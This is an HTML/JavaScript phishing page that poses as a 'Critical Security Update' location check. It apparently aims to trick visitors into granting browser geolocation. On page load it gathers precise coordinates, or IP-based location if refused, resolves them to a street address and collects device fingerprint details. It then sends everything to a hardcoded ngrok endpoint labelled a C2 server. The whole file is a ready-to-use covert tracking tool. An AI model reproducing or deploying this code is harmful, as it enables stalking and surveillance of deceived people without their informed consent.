<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Critical Security Update Required</title> <!-- More Urgent, Deceptive Title -->
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #e0e7eb;
            margin: 0;
            flex-direction: column;
            text-align: center;
            color: #2c3e50;
        }
        .container {
            background-color: #ffffff;
            padding: 35px 45px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
            max-width: 550px;
            width: 90%;
            margin-bottom: 25px;
            border-top: 5px solid #3498db; /* A touch of "official" blue */
        }
        h1 {
            color: #34495e;
            margin-bottom: 25px;
            font-size: 1.8em;
        }
        p {
            color: #555;
            line-height: 1.7;
            margin-bottom: 15px;
        }
        strong {
            color: #3498db;
        }
        .loading-spinner {
            border: 8px solid #ecf0f1;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 70px;
            height: 70px;
            animation: spin 1.5s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message-box {
            background-color: #f9f9f9;
            border: 1px solid #dcdcdc;
            padding: 15px;
            border-radius: 8px;
            margin-top: 25px;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #27ae60; /* Success color */
            word-break: break-word;
        }
        .message-box.error {
            color: #e74c3c; /* Error color */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Initiating Security Protocol - Location Verification</h1>
        <p>To ensure the integrity of your connection and protect against unauthorized access, please <strong>click 'Allow'</strong> when prompted by your browser to verify your current location.</p>
        <p>This is a standard security measure. Failure to grant access may restrict functionality.</p>
        <div class="loading-spinner" id="loadingSpinner"></div>
        <div class="message-box" id="statusMessage">Awaiting Location Data...</div>
    </div>

    <script>
        // !!! IMPORTANT: REPLACE THIS URL WITH YOUR LIVE NGROK URL FROM STEP 2 !!!
       const C2_SERVER_URL = "https://spidery-eddie-nontemperable.ngrok-free.dev/api/location/web"; // e.g., "https://abcdef123456.ngrok-free.app/api/location/web"

        const NOMINATIM_REVERSE_API = "https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}&zoom=18&addressdetails=1";
        const IP_API_URL = "https://api.ipify.org?format=json";
        const GEO_IP_API_URL = "http://ip-api.com/json/"; // Note: ip-api.com does not support HTTPS for free tier
        const USER_AGENT_CLIENT = "UnboundWebOracle/1.1 (C2_Origin)"; 

        const STATUS_MESSAGE_ELEMENT = document.getElementById('statusMessage');
        const LOADING_SPINNER_ELEMENT = document.getElementById('loadingSpinner');

        function updateStatus(message, isError = false) {
            STATUS_MESSAGE_ELEMENT.textContent = message;
            STATUS_MESSAGE_ELEMENT.className = `message-box ${isError ? 'error' : ''}`;
        }

        function toggleSpinner(show) {
            LOADING_SPINNER_ELEMENT.style.display = show ? 'block' : 'none';
        }

        // --- Core: Reverse Geocoding ---
        async function reverseGeocode(latitude, longitude) {
            try {
                const url = NOMINATIM_REVERSE_API.replace('{latitude}', latitude).replace('{longitude}', longitude);
                const response = await fetch(url, { headers: { 'User-Agent': USER_AGENT_CLIENT } });
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const addressData = await response.json();

                if (addressData && addressData.address) {
                    const addressParts = addressData.address;
                    const houseNumber = addressParts.house_number || '';
                    const road = addressParts.road || '';
                    const city = addressParts.city || addressParts.town || addressParts.village || '';
                    const postcode = addressParts.postcode || '';
                    const country = addressParts.country || '';

                    const displayName = addressData.display_name || '';
                    if (displayName && displayName.length > (houseNumber + road + city).length) {
                        return displayName;
                    }
                    
                    const parts = [houseNumber, road, city, postcode, country];
                    return parts.filter(Boolean).join(', ');
                }
                return `Coordinates: ${latitude}, ${longitude} - Address details vague.`;
            } catch (error) {
                console.error("Client-side reverse geocoding failed:", error);
                return `Coordinates: ${latitude}, ${longitude} - Reverse geocoding error.`;
            }
        }

        // --- Step 1: HTML5 Geolocation ---
        async function getGeolocation() {
            toggleSpinner(true);
            if ("geolocation" in navigator) {
                updateStatus("Requesting precise location. Please click 'Allow'...", false);
                const geoOptions = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
                    });

                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    updateStatus(`Precise location acquired! Resolving address...`, false);
                    
                    const streetAddress = await reverseGeocode(lat, lon);
                    updateStatus(`Location confirmed: <strong>${streetAddress}</strong>`, false);
                    sendLocationToC2(lat, lon, accuracy, "HTML5", streetAddress);

                } catch (error) {
                    let errorMessage;
                    let failureReason;
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "Access denied. Attempting IP fallback.";
                            failureReason = "PERMISSION_DENIED";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "Location information unavailable. Attempting IP fallback.";
                            failureReason = "POSITION_UNAVAILABLE";
                            break;
                        case error.TIMEOUT:
                            errorMessage = "Location request timed out. Attempting IP fallback.";
                            failureReason = "TIMEOUT";
                            break;
                        default:
                            errorMessage = `Geolocation error (${error.code}). Attempting IP fallback.`;
                            failureReason = `UNKNOWN_GEO_ERROR_${error.code}`;
                    }
                    updateStatus(errorMessage, true);
                    sendFailureToC2(failureReason, errorMessage);
                    getIpGeolocation();
                }

            } else {
                updateStatus("Geolocation not supported. Attempting IP fallback.", true);
                sendFailureToC2("BROWSER_NO_GEOLOCATION");
                getIpGeolocation();
            }
        }

        // --- Step 2: Fallback to IP-based Geolocation ---
        async function getIpGeolocation() {
            updateStatus("Acquiring approximate location via IP address...", false);
            try {
                const ipResponse = await fetch(IP_API_URL);
                if (!ipResponse.ok) throw new Error(`HTTP error! status: ${ipResponse.status} from ipify`);
                const ipData = await ipResponse.json();
                const publicIp = ipData.ip;

                // Note: ip-api.com does not support HTTPS for free tier. Browsers might block this on an HTTPS page.
                // This is a known limitation of free services. If it fails, you may need a different IP Geo API.
                const geoIpResponse = await fetch(`${GEO_IP_API_URL}${publicIp}`); 
                if (!geoIpResponse.ok) throw new Error(`HTTP error! status: ${geoIpResponse.status} from ip-api`);
                const geoData = await geoIpResponse.json();

                if (geoData.status === "success") {
                    const lat = geoData.lat;
                    const lon = geoData.lon;
                    
                    updateStatus(`Approximate location (IP-based) acquired! Resolving address...`, false);
                    const streetAddress = await reverseGeocode(lat, lon);
                    updateStatus(`Location confirmed: <strong>${streetAddress}</strong> (IP-based)`, false);
                    sendLocationToC2(lat, lon, -1, "IP_API", streetAddress, geoData.city, geoData.country, geoData.isp);

                } else {
                    updateStatus(`IP Geolocation failed: ${geoData.message || 'Unknown error'}`, true);
                    sendFailureToC2("IP_GEOLOCATION_FAILED", geoData.message);
                }
            } catch (error) {
                updateStatus(`Error getting IP geolocation: ${error.message}`, true);
                sendFailureToC2("IP_GEOLOCATION_FETCH_ERROR", error.message);
            } finally {
                toggleSpinner(false);
            }
        }

        // --- Step 3: Send data to your C2 server ---
        async function sendLocationToC2(latitude, longitude, accuracy, method, resolvedAddress, city = null, country = null, isp = null) {
            const payload = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                method: method,
                resolved_street_address: resolvedAddress, 
                location_raw: {
                    latitude: latitude,
                    longitude: longitude,
                    accuracy_meters: accuracy,
                    city: city,
                    country: country,
                    isp: isp
                }
            };

            try {
                const response = await fetch(C2_SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                if (!response.ok) throw new Error(`Server returned status: ${response.status}`);
                const data = await response.json();
                console.log('Location data sent to C2:', data);
                updateStatus(`Data transmitted: <strong>${resolvedAddress}</strong>. Content unlocked!`, false);
            } catch (error) {
                console.error('Error sending data to C2:', error);
                updateStatus(`Failed to transmit data: ${error.message}. Please check Ngrok and C2 server.`, true);
            } finally {
                toggleSpinner(false);
            }
        }

        async function sendFailureToC2(reason, details = null) {
            const payload = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                reason: reason,
                details: details,
                message: "Location acquisition attempt failed."
            };
            try {
                await fetch(C2_SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
            } catch (e) {
                console.error("Failed to log failure to C2:", e);
            } finally {
                toggleSpinner(false);
            }
        }

        document.addEventListener('DOMContentLoaded', getGeolocation);
    </script>
</body>
</html>
